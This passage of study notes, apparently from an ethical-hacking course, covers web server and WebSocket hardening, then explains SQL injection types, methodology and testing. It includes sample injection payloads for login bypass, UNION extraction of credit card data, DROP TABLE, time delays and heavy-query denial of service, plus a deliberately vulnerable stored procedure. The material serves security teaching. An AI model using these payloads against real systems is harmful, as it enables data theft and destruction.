		- Protect the web server by using a Web Application Firewall (WAF) or an Intrusion Detection System (IDS) and filtering packets. Regularly update the server’s software with patches to prevent vulnerabilities.
		- Secure user input by sanitizing and filtering it to prevent malicious data injection. Analyze the source code for SQL injection risks and minimize the use of third-party applications.
		- Enhance database security by using stored procedures and parameterized queries to retrieve data. Disable verbose error messages that could provide attackers with useful information and replace them with custom error pages.
		- Restrict database access by connecting with a non-privileged account and granting the least privileges necessary to databases, tables, and columns. Disable commands like xp_cmdshell, which could allow attackers to execute system-level commands.
	- Securing WebSocket Connections:
		- Securing WebSocket connections is essential to protect data transmitted between clients and servers from unauthorized access and attacks. Follow these best practices to enhance WebSocket security:
		- Use Secure WebSocket Protocol: Always use wss:// instead of ws:// to encrypt WebSocket data in transit with TLS/SSL.
		- Validate the Origin Header: Ensure the server accepts WebSocket connections only from trusted domains by validating the Origin header.
		- Implement Authentication: Use token-based authentication (e.g., JWT) to verify users before establishing a WebSocket connection.
		- Enforce Role-Based Access Control (RBAC): Restrict actions over WebSocket connections based on user roles to prevent unauthorized operations.
		- Limit Message Size: Set a maximum message size to prevent denial-of-service (DoS) attacks.
		- Apply Rate Limiting: Control the number of messages a client can send within a timeframe to prevent abuse and mitigate spam.
		- Enforce Session Timeouts: Automatically close inactive WebSocket connections to reduce security risks.
		- Log and Monitor Activity: Record all WebSocket connections and activities for auditing. Implement real-time monitoring to detect and respond to suspicious behavior.
		- Use WebSocket Subprotocols: Define and enforce specific communication protocols between the client and server for structured interactions.
		- Ensure Valid Server Certificates: Use certificates issued by a trusted Certificate Authority (CA) to prevent man-in-the-middle attacks.
		- Use Secure WebSocket Libraries: Choose well-maintained WebSocket libraries and frameworks with active security updates.
		- Set Security Headers: Implement security headers such as Content Security Policy (CSP) and X-Frame-Options to protect WebSocket connections from cross-site attacks.
	- RASP for Protecting Web Servers:
		- Runtime Application Self-Protection (RASP) is a security technology designed to protect applications running on a server. It detects runtime attacks in real-time at the software application layer, providing enhanced visibility into hidden vulnerabilities. RASP can identify malicious activity in incoming traffic and validate data requests. It safeguards both web and non-web applications and prevents unauthorized programs from executing within an application.
		- RASP continuously monitors and mitigates attacks, including unknown zero-day threats, at an early stage without requiring human intervention. The RASP layer is integrated into the application code, where it inspects incoming server traffic and applies protective measures when threat vectors are detected. All requests pass through the RASP layer, positioned between the server and the application, without compromising performance. Additionally, RASP minimizes false positives while enhancing security.
		- Benefits of Using RASP:
			- Visibility: RASP offers greater visibility, allowing users to monitor applications and detect attacks in detail.
			- Collaboration and DevOps: It improves collaboration and DevOps by providing transparent, detailed security insights for both developers and security professionals.
			- Penetration Testing: RASP's enhanced visibility reduces redundant testing and provides insights into successful attacks and previously tested applications.
			- Incident Response: RASP supports incident response by enabling security logging and compliance reporting, allowing users to log customized events without modifying the application.
	- Web Application Security Testing Tools:
		- Various web application security assessment tools are available for scanning, detecting, and evaluating vulnerabilities in web applications. These tools help assess security posture, identify weaknesses, and strengthen application security. By automating the security assessment process, they ensure more accurate and efficient vulnerability detection. This section highlights some key web application security testing tools.
		- N-Stalker Web App Security Scanner (www.nstalker.com): N-Stalker Web App Security Scanner detects vulnerabilities such as SQL injection, cross-site scripting (XSS), and other known attacks. It is a valuable security tool for developers, system administrators, security professionals, and IT auditors. The scanner integrates the well-known “N-Stealth HTTP Security Scanner” and its database of 39,000 web attack signatures with component-oriented web application security assessment technology.
		- Veracode (www.veracode.com): Veracode enables testing teams to scan code at each development stage using IDE, pipeline, and policy scans. It helps mitigate security risks and enhances the productivity of both security and development teams. Veracode Web Application Scanning offers dynamic analysis security testing (DAST) to identify vulnerabilities in applications running in production.
		- Invicti (www.invicti.com): Invicti is an application security testing tool that significantly reduces the risk of web attacks by performing accurate, automated security assessments. It automates various security tasks and employs a dynamic and interactive scanning approach (DAST + IAST) to detect vulnerabilities in web applications.
		- Contrast Security (www.contrastsecurity.com)
		- Snyk (snyk.io)
		- CodeSonar (codesecure.com)
		- HCL AppScan (www.hcl-software.com)
	- Web Application Firewalls:
		- Web Application Firewalls (WAFs) protect websites, web applications, and web services from known and unknown cyber threats. They help prevent data breaches and unauthorized manipulation of sensitive corporate and customer information. Some of the most widely used WAFs include:
		- Cloudflare Web Application Firewall (WAF) (www.cloudflare.com): Cloudflare Web Application Firewall enables security professionals to create custom rules to safeguard websites and APIs from malicious traffic. It incorporates advanced features such as WAF attack scoring and content scanning for uploaded files. Additionally, it allows users to define rate limits for incoming requests based on specific expressions and determine actions to be taken when those limits are exceeded.
		- Imperva's Web Application Firewall (www.imperva.com)
		- AppWall (www.radware.com)
		- Qualys WAF (www.qualys.com)
		- Barracuda Web Application Firewall (www.barracuda.com)
		- NetScaler WAF (www.netscaler.com)


--------------------------------------------------

# SQL Injection

- SQL Injection:
	- Structured Query Language (SQL) is a textual language used by a database server to manage and manipulate data. SQL commands, such as INSERT, SELECT, UPDATE, and DELETE, perform operations on the database. Programmers often use sequential SQL commands with client-supplied parameters, which can make applications vulnerable to SQL injection attacks.
	- SQL injection is a technique that exploits unsanitized input vulnerabilities, allowing attackers to pass malicious SQL commands through a web application for execution by a backend database. In this attack, the attacker injects harmful SQL queries into user input forms to gain unauthorized access to a database or retrieve sensitive information.
	- These attacks occur due to flaws in web applications rather than issues with the database or web server itself. SQL injection attacks manipulate the database by injecting a series of malicious SQL queries or statements. Since applications often use SQL statements for authentication, role validation, data retrieval, and integration with other data sources, attackers can exploit improper input validation to compromise security.
	- SQL injection is possible when an application fails to properly validate user input before passing it to an SQL statement. Proper input sanitization and the use of prepared statements or parameterized queries can help prevent such attacks.
	- Why Care About SQL Injection:
		- SQL injection is a serious threat to all database-driven websites. Any website or software application that processes user-supplied data can be vulnerable to this type of attack, depending on how it handles input and executes SQL queries.
		- SQL injection can be exploited to carry out the following types of attacks:
			- Authentication Bypass: An attacker logs into an application without providing a valid username and password, potentially gaining administrative privileges.
			- Authorization Bypass: An attacker modifies authorization information stored in the database by exploiting an SQL injection vulnerability.
			- Information Disclosure: An attacker gains unauthorized access to sensitive information stored in the database.
			- Compromised Data Integrity: An attacker defaces a website, inserts malicious content, or alters database records.
			- Compromised Data Availability: An attacker deletes critical database information, logs, or audit records, disrupting normal operations.
			- Remote Code Execution: An attacker exploits an SQL injection vulnerability to execute arbitrary code on the host operating system, potentially gaining full control over the server.
		- Proper input validation, the use of parameterized queries, and other security measures can help mitigate the risk of SQL injection attacks.
	- SQL Injection and Server-Side Technologies:
		- Server-side technologies like ASP.NET, PHP, Python, and Ruby on Rails enable dynamic, data-driven web applications. These technologies interact with databases such as Microsoft SQL Server, Oracle, IBM DB2, and MySQL. However, insecure coding practices can expose applications to SQL injection attacks, which exploit vulnerabilities in web applications rather than database or server flaws.
	- Understanding HTTP POST Requests:
		- An HTTP POST request sends data in the message body, making it more secure than GET. It supports large data transmission, commonly used for form submissions and web services. When a user submits credentials, the browser sends a request like: SELECT * FROM Users WHERE (username = 'smith' AND password = 'simpson');
		- Without proper input validation, attackers can manipulate such queries, highlighting the need for secure coding practices.
	- Types of SQL Injection:
		- In an SQL injection attack, the attacker injects malicious code into an SQL query, allowing them to read sensitive data and even modify it (insert/update/delete).
		- There are three main types of SQL injection attacks:
			- In-band SQL Injection: The attacker uses the same communication channel to execute the attack and retrieve results. In-band attacks are the most common and easiest to exploit. The two most frequently used in-band SQL injection techniques are error-based SQL injection and UNION SQL injection.
			- Blind/Inferential SQL Injection: In this type of attack, the attacker does not receive direct error messages from the system. Instead, they send malicious SQL queries and analyze the responses, which are usually in Boolean form (true/false). Since no actual data is returned through the web application, attackers infer database structure and content based on the responses. This method takes longer to execute, hence the term blind SQL injection.
			- Out-of-Band SQL Injection: This attack relies on alternative communication channels (such as database email functionality or file-writing/loading features) to extract data. It is more challenging to execute because the attacker must establish communication with the server and determine the specific features of the database system used by the web application.
		- In-Band SQL Injection:
			- In an in-band SQL injection attack, attackers use the same communication channel to execute the attack and retrieve results. Depending on the technique used, there are different types of in-band SQL injection attacks. The two most common methods are error-based SQL injection and UNION SQL injection.
			- Types of In-Band SQL Injection:
				- Error-Based SQL Injection:
					- In this method, an attacker deliberately inputs malformed data into an application, causing it to generate database errors. These error messages can reveal valuable information about the database structure and vulnerabilities. The attacker then uses this information to inject malicious SQL queries specifically designed to compromise the application's data security. This technique is particularly useful for identifying and exploiting vulnerabilities.
				- System Stored Procedure:
					- The risk of executing a malicious SQL query in a stored procedure increases if the web application does not properly sanitize user inputs used to dynamically construct SQL statements. An attacker may exploit this vulnerability by injecting malicious inputs into a stored procedure to execute unauthorized SQL commands.
					- For example:
						CREATE PROCEDURE Logi
							@user_name VARCHAR(20)
							@password VARCHAR(20)
						AS
						DECLARE @query VARCHAR(250)
						SET @query = 'SELECT 1 FROM usertable WHERE username = ''' + @user_name + ''' AND password = ''' + @password + ''''
						EXEC(@query)
						GO
					- If an attacker inputs the following values in the application's login fields:
						Username: anyusername' OR 1=1 --
						Password: anypassword
					- The resulting SQL query bypasses authentication, allowing the attacker to log in with any password.
				- Illegal/Logically Incorrect Query:
					- Attackers can gain insights into the database structure by injecting illegal or logically incorrect queries. These queries can reveal information such as injectable parameters, data types, and table names. In this type of SQL injection attack, an attacker deliberately sends an invalid query to generate an error message that exposes details about the database schema, which can be used for further exploitation.
					- For example, to determine column names, an attacker may input: Username: 'Bob"
					- The resulting SQL query: SELECT * FROM Users WHERE UserName = 'Bob"' AND password = 'xxx'
					- This causes the database to return an error message, such as: "Incorrect syntax near 'Bob'. Unclosed quotation mark after the character string '' AND Password='xxx''."
					- Such error messages help attackers extract information about the database structure.
				- UNION SQL Injection:
					- The UNION SELECT statement allows an attacker to merge malicious results with the original query’s dataset. In a UNION SQL injection, an attacker appends a UNION clause to the original query to retrieve unauthorized data from another table.
					- For example:
						SELECT Name, Phone, Address FROM Users WHERE Id = 1
						UNION ALL
						SELECT creditCardNumber, 1, 1 FROM CreditCardTable
					- To test for a UNION SQL injection vulnerability, an attacker may append a single quote (') to the end of a .php?id= parameter. If an error message appears, it indicates that the database may be vulnerable to UNION-based SQL injection.
				- Tautology:
					- In a tautology-based SQL injection attack, an attacker manipulates the WHERE clause using a conditional OR statement so that the condition always evaluates to TRUE. This technique is commonly used to bypass authentication mechanisms.
					- For example: SELECT * FROM users WHERE name = '' OR '1' = '1';
					- Since '1' = '1' always evaluates to TRUE, this query returns all records in the table, allowing an attacker to bypass authentication.
				- End-of-Line Comment:
					- In this type of SQL injection, an attacker exploits SQL comment syntax to manipulate queries. Comments in SQL, typically denoted by (--), cause the database to ignore the rest of the line. An attacker can use this technique to bypass authentication checks by truncating a query at a crucial point.
					- For example: SELECT * FROM members WHERE username = 'admin'--' AND password = 'password';
					- Here, everything after -- is ignored, effectively reducing the query to: SELECT * FROM members WHERE username = 'admin';
					- As a result, the attacker can log in as an administrator without needing a password.
				- In-Line Comments:
					- Attackers can use in-line comments (/* ... */) to obfuscate SQL injection payloads, bypass input validation, or manipulate queries. This technique helps attackers evade security mechanisms such as blacklists or input sanitization.
					- For example, consider the following dynamic SQL query:
						INSERT INTO Users (UserName, isAdmin, Password)
						VALUES ('".$username."', 0, '".$password."')
					- An attacker might inject the following input:
						UserName: Attacker', 1, /*
						Password: mypwd */
					- The resulting SQL query:
						INSERT INTO Users (UserName, isAdmin, Password)
						VALUES ('Attacker', 1, /*', 0, '*/'mypwd');
					- This injection tricks the database into assigning administrative privileges to the attacker.
				- Piggybacked Query:
					- In a piggybacked SQL injection attack, an attacker appends an additional malicious SQL query to the original query using a query delimiter (;). The original query executes normally, but the injected query executes immediately afterward. This technique, also called stacked queries, allows attackers to extract, modify, or delete data, execute remote commands, or launch a Denial of Service (DoS) attack.
					- For example, consider the original query: SELECT * FROM EMP WHERE EMP.EID = 1001 AND EMP.ENAME = 'Bob';
					- An attacker modifies the input to include a malicious query:
						SELECT * FROM EMP WHERE EMP.EID = 1001 AND EMP.ENAME = 'Bob';
						DROP TABLE DEPT;
					- After executing the first query, the database recognizes the semicolon (;) as a query delimiter and executes the second query, which deletes the DEPT table from the database.
			- Error-Based SQL Injection:
				- Error-based SQL injection is a technique where an attacker manipulates a database query to trigger an error message. These error messages can reveal valuable information about the database structure, such as table names, column names, or database user details. Attackers use this method when other SQL injection techniques are not immediately exploitable.
				- The primary goal of this technique is to force the database to generate an error message, which can then be analyzed to craft further malicious queries. The effectiveness of this attack varies depending on the Database Management System (DBMS) in use.
				- Example of Error-Based SQL Injection:
					- Consider the following SQL query used in a web application: SELECT * FROM products WHERE id_product = $id_product;
					- A request to a script executing this query might look like this: http://www.example.com/product.php?id=10
					- An attacker can manipulate this request to inject a malicious payload. For example, in Oracle 10g, the attacker might send: http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME((SELECT user FROM DUAL))--
				- Explanation of the Attack:
					- The attacker appends ||UTL_INADDR.GET_HOST_NAME((SELECT user FROM DUAL))-- to the id parameter.
					- UTL_INADDR.GET_HOST_NAME() is an Oracle function that attempts to retrieve the hostname of the provided parameter.
					- The parameter in this case is (SELECT user FROM DUAL), which returns the database username.
					- Since the database treats the username as a hostname lookup, it fails and returns an error message, such as: ORA-292257: host SCOTT unknown
					- The attacker can then modify the input to extract additional database details using similar queries.
				- This method exploits database error messages to gain unauthorized access and gather information, ultimately leading to a successful SQL injection attack.
			- UNION SQL Injection:
				- In a UNION SQL injection attack, an attacker manipulates a SQL query by appending a UNION clause, which allows combining results from multiple queries. This technique enables the attacker to retrieve values from different database tables, even if those tables are not intended to be accessed by the original query.
				- Step 1: Determining the Number of Columns
					- To execute a UNION SQL injection, the attacker first determines the number of columns in the target table. This is typically done by incrementing the column count in an ORDER BY clause until an error occurs: ORDER BY 10--
					- If the query executes successfully, it means the table has 10 or more columns.
					- If an error message appears, such as: Unknown column '10' in 'order clause'
					- then the attacker knows there are fewer than 10 columns.
					- By systematically adjusting the column count, the attacker can determine the exact number of columns.
				- Step 2: Identifying Column Data Types
					- Once the number of columns is known, the attacker determines the data types of those columns.
					- This is done using a UNION SELECT query with NULL or known values: UNION SELECT 1, NULL, NULL--
					- If the query executes successfully, it confirms that the first column is of type INTEGER.
					- The attacker repeats this process with different values to determine the data types of all columns.
				- Step 3: Executing the UNION SQL Injection
					- After identifying the column structure, the attacker injects a malicious UNION SELECT query to extract sensitive information.
					- For example, consider the original query: SELECT Name, Phone, Address FROM Users WHERE Id = $id;
					- If the attacker sets the id parameter as follows: $id=1 UNION ALL SELECT creditCardNumber, 1, 1 FROM CreditCardTable
					- The final injected query becomes:
						SELECT Name, Phone, Address FROM Users WHERE Id = 1
						UNION ALL
						SELECT creditCardNumber, 1, 1 FROM CreditCardTable;
					- This combines the results of the original query with credit card numbers from the CreditCardTable, allowing the attacker to retrieve sensitive user data.
		- Blind/Inferential SQL Injection:
			- Blind SQL Injection occurs when a web application is vulnerable to SQL injection, but the results of the injection are not directly visible to the attacker. It is similar to a standard SQL Injection, except that when an attacker attempts to exploit the vulnerability, they receive a generic or custom error page instead of a detailed error message.
			- In blind SQL injection, an attacker poses a series of true-or-false questions to the database to determine whether the application is susceptible to SQL injection. Typically, standard SQL injection attacks are possible when developers use detailed error messages that inadvertently reveal sensitive information, providing a pathway for exploitation. However, when developers suppress error messages, it becomes more challenging—but not impossible—for attackers to conduct an SQL injection attack.
			- Blind SQL injection differs from standard SQL injection in how data is retrieved from the database. Attackers use this method to either access sensitive information or manipulate data. By sending carefully crafted SQL queries, they can extract data bit by bit through a sequence of true-or-false questions. Since the results are not directly displayed, this attack can be time-consuming, as the database must generate a new statement for each recovered piece of information.
			- No Error Message Returned:
				- When an attacker attempts an SQL injection using the query "certifiedhacker'; DROP TABLE Orders --", two types of error messages may be returned. A generic error message can provide valuable information that helps the attacker refine their SQL injection attempts. However, if the developer disables generic error messages and instead implements a custom error message, the attacker will not receive useful feedback. In this case, they may resort to a blind SQL injection attack.
				- If generic error messaging is enabled, the server returns a detailed error message, including database driver information and ODBC SQL server details. This data can further aid the attacker in executing an SQL injection attack. Conversely, when custom error messaging is used, the browser only displays a vague error message indicating that the request was unsuccessful, without revealing specific details. As a result, the attacker has no choice but to attempt a blind SQL injection attack.
			- Time-Based SQL Injection:
				- Time-based SQL injection (also known as time delay SQL injection) exploits the time delay that occurs in response to true or false queries sent to the database. A WAITFOR DELAY statement pauses the SQL server for a specified duration. By analyzing the response time, an attacker can extract information, such as whether they are connected to the database as a system administrator or another user, and then launch further attacks.
				- Example of a Time-Based SQL Injection Attack:
					- Query: IF EXISTS(SELECT * FROM creditcard) WAITFOR DELAY '0:0:10'--
					- Step 1: Check if the database “creditcard” exists.
					- Step 2: If the database does not exist, the system returns the message: "We are unable to process your request. Please try again later."
					- Step 3: If the database exists, the system pauses for 10 seconds before displaying the same message: "We are unable to process your request. Please try again later."
				- Since no error message is returned, attackers use the WAITFOR DELAY command to determine whether the SQL query is being executed successfully.
				- Common SQL Commands for Time-Based Injection:
					- SQL Server (WAITFOR DELAY)
						WAITFOR DELAY 'time' (in seconds)
						- This functions like a sleep command, making the database wait for the specified duration.
						- Example: WAITFOR DELAY '0:0:10'-- (Pauses execution for 10 seconds)
					- MySQL (BENCHMARK())
						BENCHMARK(iterations, operation)
						- This command runs on MySQL servers and executes an operation a specified number of times to create a delay.
						- Example: BENCHMARK(1000000, MD5('test')) (Runs the MD5 hash function a million times to slow down execution)
			- Boolean Exploitation:
				- Boolean-based blind SQL injection (also known as inferential SQL injection) is performed by sending specific queries to the application's database and analyzing the responses. Attackers inject multiple valid SQL statements that evaluate as true or false in an affected parameter within an HTTP request. By comparing the application's response in both cases, the attacker can determine whether the injection was successful.
				- If the attacker crafts and executes the correct request, they can extract critical information from the database, which can then be used to launch further attacks. This technique is commonly used when an application appears to be vulnerable to blind SQL injection but does not return standard error messages. In such cases, attackers rely on Boolean logic to infer database details.
				- Example of Boolean-Based SQL Injection:
					- Consider the following URL, which retrieves details of an item with id = 67: http://www.myshop.com/item.aspx?id=67
					- The corresponding SQL query executed on the database is: SELECT Name, Price, Description FROM ITEM_DATA WHERE ITEM_ID = 67
					- An attacker may modify this request to: http://www.myshop.com/item.aspx?id=67 AND 1=2
					- This alters the SQL query as follows: SELECT Name, Price, Description FROM ITEM_DATA WHERE ITEM_ID = 67 AND 1=2
					- Since 1=2 is always false, no results will be returned, and no item details will be displayed on the webpage.
					- Next, the attacker modifies the request to: http://www.myshop.com/item.aspx?id=67 AND 1=1
					- The corresponding SQL query becomes: SELECT Name, Price, Description FROM ITEM_DATA WHERE ITEM_ID = 67 AND 1=1
					- Since 1=1 is always true, the item details are displayed.
					- From these responses, the attacker can confirm that the page is vulnerable to SQL injection and may proceed to extract further database information using Boolean-based techniques.
			- Heavy Query:
				- In some cases, time delay functions in SQL queries may be disabled by the database administrator, making it impossible to use traditional time-based SQL injection techniques. However, an attacker can still achieve a time delay effect by using heavy queries—queries that retrieve a massive amount of data and take a long time to execute on the database engine.
				- Attackers generate heavy queries by performing multiple joins on system tables, as queries on these tables typically require significant processing time. This allows them to execute a time-based SQL injection attack without relying on built-in time delay functions.
				- Example of a Heavy Query in Oracle:
					- The following is an example of a heavy query in Oracle that takes a long time to execute: SELECT count(*) FROM all_users A, all_users B, all_users C;
					- If an attacker injects a malicious parameter into the query to perform time-based SQL injection without using functions, it may take the following form: 1 AND 1 < (SELECT count(*) FROM all_users A, all_users B, all_users C);
					- The final SQL query executed by the application may look like this: SELECT * FROM products WHERE id = 1 AND 1 < (SELECT count(*) FROM all_users A, all_users B, all_users C);
					- Since this query involves multiple joins on system tables, it significantly slows down database execution, allowing the attacker to infer information based on response time.
				- Impact of Heavy Query Attacks: Heavy query attacks are a newer form of SQL injection that can severely impact server performance. By overloading the database with complex queries, attackers can cause significant delays, degrade application responsiveness, and potentially create denial-of-service (DoS) conditions.
		- Out-of-Band SQL Injection:
			- Out-of-band SQL injection attacks are more difficult to execute because they require the attacker to communicate with the server and determine the specific features of the database server used by the web application. In this type of attack, the attacker leverages alternative communication channels—such as database email functionality or file writing and loading functions—to perform the attack and retrieve results.
			- This technique is typically used when in-band (error-based) or blind SQL injection is not feasible, meaning the attacker cannot use the same channel through which requests are being made to extract data. Instead, attackers rely on DNS and HTTP requests to retrieve information from the database server.
			- Examples of Out-of-Band SQL Injection:
				- Microsoft SQL Server: Attackers exploit the xp_dirtree command to send DNS requests to a server they control.
				- Oracle Database: Attackers use the UTL_HTTP package to send HTTP requests from SQL or PL/SQL to a remote server under their control.
			- By using these methods, attackers can exfiltrate data without directly displaying results within the vulnerable web application.
	- SQL Injection Methodology:
		- The SQL injection methodology consists of the following steps:
			- Information gathering and vulnerability detection: Identifying SQL injection vulnerabilities in the target system.
			- Launching SQL injection attacks: Exploiting the identified vulnerabilities to gain unauthorized access.
			- Compromising the target network (Advanced SQL Injection): Escalating privileges and taking control of the entire system.
		- Information Gathering and SQL Injection Vulnerability Detection:
			- Information Gathering:
				- During the information-gathering stage, attackers attempt to collect details about the target database, including its name, version, users, output mechanism, database type, user privilege levels, and OS interaction capabilities.
				- Understanding the underlying SQL queries helps attackers craft accurate SQL injection statements. Error messages play a crucial role in extracting information from the database. Depending on the type of errors encountered, attackers may employ different SQL injection techniques. This reconnaissance process, also known as the survey and assess method, allows attackers to gather comprehensive details about a potential target, including the database type, version, and user privilege levels.
				- Attackers typically gather information at multiple levels, beginning with the identification of the database type and search engine. Since different databases require different SQL syntax, determining the database engine used by the server is essential. Identifying privilege levels is another key step, as attackers seek to escalate their access and gain administrative privileges. Once they obtain sufficient access, they attempt to retrieve passwords and compromise the system. By interacting with the OS through command shell execution, an attacker can potentially take control of the entire network.
				- Steps for Information Gathering:
					- Verify whether the web application connects to a database server to retrieve data.
					- Identify all input fields, hidden fields, and POST request parameters that could be used to construct SQL queries.
					- Attempt to inject code into input fields to trigger database errors.
					- Enter a string value where a numerical input is expected to test for vulnerabilities.
					- Use the UNION operator to merge result sets from multiple SELECT statements.
					- Analyze detailed error messages to gather insights for executing SQL injection attacks.
				- This process helps attackers understand the database structure, identify vulnerabilities, and develop an effective SQL injection strategy.
			- Identifying Data Entry Paths:
				- An attacker seeks to identify all possible input points within an application that can be exploited using SQL injection techniques. To accomplish this, automated tools such as Tamper Dev and Burp Suite may be used.
				- Potential entry points include:
					- Input fields on web forms
					- Hidden fields
					- Cookies used for session management
				- By analyzing GET and POST requests sent to the target application, attackers can pinpoint vulnerabilities. The following tools help in identifying data entry paths for SQL injection:
					- Tamper Dev (chromewebstore.google.com): Tamper Dev enables the interception and modification of HTTP/HTTPS requests and responses. Users can alter outgoing requests, modify responses upon interception, and trigger new requests, making it a valuable tool for security testing.
					- Burp Suite (www.portswigger.net): Burp Suite is a powerful web application security testing tool that allows attackers to inspect and manipulate traffic between a browser and a target application. It helps identify vulnerabilities such as SQL injection, cross-site scripting (XSS), and other security flaws.
			- Extracting Information Through Error Messages:
				- Error messages play a crucial role in extracting information from a database. In certain SQL injection techniques, attackers intentionally trigger errors to reveal details about the database. If developers use generic or verbose error messages, these can inadvertently provide valuable insights to attackers.
				- When an attacker inputs malicious data into an application, the database may generate an error message related to syntax, permissions, or other issues. These messages can disclose critical details such as: Operating System (OS) details, Database type and version, User privilege levels, OS interaction capabilities
				- By analyzing the error messages, attackers can determine which SQL injection technique to use to exploit the application's vulnerabilities.
				- Methods of Extracting Information from Error Messages:
					- Parameter Tampering:
						- Attackers manipulate HTTP GET and POST requests to induce errors and extract database information. Tools like Burp Suite and Tamper Dev can intercept and modify these requests. Error messages obtained through this technique may reveal:
							- The name of the database server
							- Directory structure
							- Functions used in SQL queries
						- Attackers can tamper with parameters directly in the browser’s address bar or use proxy tools.
						- Example:
							- http://certifiedhacker.com/download.php?id=car
							- http://certifiedhacker.com/download.php?id=horse
							- http://certifiedhacker.com/download.php?id=book
						- If improper input validation exists, changing parameter values may produce different errors, helping attackers gain insights into the database structure.
					- Determining the Database Engine Type:
						- Identifying the database engine is crucial for executing a successful SQL injection attack. One of the simplest ways to determine the database type is by triggering ODBC errors (Open Database Connectivity errors), which often display database driver information.
						- ODBC error messages may reveal:
							- The specific database engine used (e.g., MySQL, PostgreSQL, SQL Server)
							- Configuration details that aid in further exploitation
						- If ODBC errors are not available, attackers can make an educated guess based on the operating system and web server used.
					- Determining a SELECT Query Structure:
						- Using the error messages obtained, an attacker can extract the original structure of the query used in the application. This allows them to construct a malicious query to manipulate the original query. To achieve this, the attacker forces the application to generate errors that reveal information such as table names, column names, and data types.
						- Attackers inject valid SQL segments while avoiding syntax errors to navigate the database without triggering errors. They attempt to achieve this by injecting simple inputs such as ' and '1' = '1 or ' and '1' = '2. Additionally, they use SQL clauses like GROUP BY column_names HAVING 1=1 -- to determine table and column names.
					- Injections:
						- Most injections occur in the middle of a SELECT statement, typically within the WHERE clause.
						- For example: SELECT * FROM table WHERE x = 'normalinput' GROUP BY x HAVING 1=1 -- GROUP BY x HAVING x = y ORDER BY x
					- Grouping Error:
						- The HAVING clause allows further refinement of a query based on grouped fields. If a column is not properly grouped, the resulting error message can reveal which columns have not been included in the GROUP BY clause.
						- For example: ' GROUP BY column_names HAVING 1=1 --
					- Type Mismatch:
						- Attempting to insert strings into numeric fields can trigger errors that reveal data type constraints. The resulting error messages indicate which values could not be converted.
						- For example:
							- ' UNION SELECT 1,1,'text',1,1,1 --
							- ' UNION SELECT 1,1, BIGINT,1,1,1 --
					- Blind Injection:
						- Blind SQL injection relies on time delays or error signatures to determine or extract information from the database.
						- For example:
							'; IF condition
							WAITFOR DELAY '0:0:5' --
							'; UNION SELECT IF(condition, BENCHMARK(100000, SHA1('test')), 'false'), 1,1,1,1;
						- Attackers exploit database-level error messages generated by an application. These messages are valuable for crafting vulnerability exploit requests. In some cases, they can even facilitate the automation of exploits based on the database server’s responses.
						- Note: If an application does not provide detailed error messages and instead returns a generic 500 Server Error or a custom error page, blind injection techniques should be used to infer database behavior.
			- SQL Injection Vulnerability Detection:
				- After gathering information, the attacker searches for SQL injection vulnerabilities in the target web application. To do this, they identify all input fields, hidden fields, and POST requests on the website. The attacker then attempts to inject malicious code into these fields to generate an error and analyze the application's response.
				- Testing for SQL Injection:
					- Standard SQL injection inputs, known as testing strings, are commonly used by attackers to exploit vulnerabilities. Penetration testers (pen testers) also use these testing strings to assess an application's security against SQL injection attacks.
					- The table below summarizes various possibilities for each testing string. These strings are widely known as an SQL injection cheat sheet, which pen testers use to identify potential vulnerabilities in web applications.
			- Additional Methods to Detect SQL Injection:
				- Function Testing:
					- Function testing is a software testing technique in which a system or application is tested against a set of inputs based on end-user requirements. The output obtained is then evaluated and compared with expected results to determine whether it meets the functionality and base requirements of the product.
					- This type of testing falls within the scope of black-box testing, meaning it does not require knowledge of the internal design, code, or logic of the application. It assesses security, user interface, database interactions, client/server applications, navigation functions, and overall system usability.
					- Example SQL Injection Test Cases:
						- http://certifiedhacker.com/?parameter=123
						- http://certifiedhacker.com/?parameter=1'
						- http://certifiedhacker.com/?parameter=1'#
						- http://certifiedhacker.com/?parameter=1"
						- http://certifiedhacker.com/?parameter=1 AND 1=1--
						- http://certifiedhacker.com/?parameter=1'-
						- http://certifiedhacker.com/?parameter=1 AND 1=2--
						- http://certifiedhacker.com/?parameter=1'/*
						- http://certifiedhacker.com/?parameter=1' AND '1'='1
						- http://certifiedhacker.com/?parameter=1 ORDER BY 1000
					- This approach helps identify vulnerabilities in applications that could be exploited using SQL injection techniques.
				- Fuzz Testing:
					- Fuzz testing (fuzzing) is an adaptive SQL injection testing technique used to detect coding errors by inputting a large volume of random data and observing changes in the output.
					- Fuzz testing is a black-box testing method used for quality assurance and security assessment. It helps identify coding errors and security vulnerabilities in web applications. Specialized tools, known as fuzzers, generate massive amounts of random data (referred to as "fuzz") and inject it into the target application to uncover weaknesses that could be exploited by various attacks.
					- Fuzz Testing Tools:
						- BeSTORM (www.beyondsecurity.com)
						- Burp Suite (portswigger.net)
						- AppScan Standard (www.hcl-software.com)
						- Defensics (www.synopsys.com)
						- SnapFuzz (portswigger.net)
				- Static Testing:
					- Static testing involves analyzing the source code of a web application to detect vulnerabilities before execution. It helps identify security flaws, logic errors, and weak coding practices without running the application.
				- Dynamic Testing:
					- Dynamic testing focuses on analyzing the runtime behavior of a web application. It involves executing the application and monitoring its response to various inputs to identify security vulnerabilities, performance issues, and unexpected behaviors.
			- SQL Injection Black Box Pen Testing:
				- In black box testing, the penetration tester does not need prior knowledge of the network or system being tested. The first task is to determine the system's location and infrastructure. The tester then attempts to identify vulnerabilities in web applications from an attacker’s perspective. Various techniques, such as using special characters, white spaces, SQL keywords, and oversized requests, help assess different conditions of the web application.
				- The following steps are involved in SQL injection black box penetration testing:
					- Detecting SQL Injection Issues:
						- Send a single quote (') as input data to detect instances where user input is not sanitized.
						- Send a double quote (") as input data to detect instances where user input is not sanitized.
					- Detecting Input Sanitization:
						- Use a right square bracket (]) as input data to check if user input is used as part of an SQL identifier without proper sanitization.
					- Detecting Truncation Issues:
						- Send long strings of junk data, similar to buffer overrun tests. This may trigger SQL errors on the page.
					- Detecting SQL Modification:
						- Send long strings of single quotes ('), right square brackets (]), or double quotes (").
						- These inputs may exceed the return values from the REPLACE and QUOTENAME functions, potentially truncating the command variable used to store the SQL statement.
			- Source Code Review to Detect SQL Injection Vulnerabilities:
				- Source code review is a security testing method that involves systematically examining source code to identify various vulnerabilities. It aims to detect and remediate security flaws introduced by developers during the development phase. This process falls under white-box testing and is typically conducted during the implementation phase of the Security Development Lifecycle (SDL).
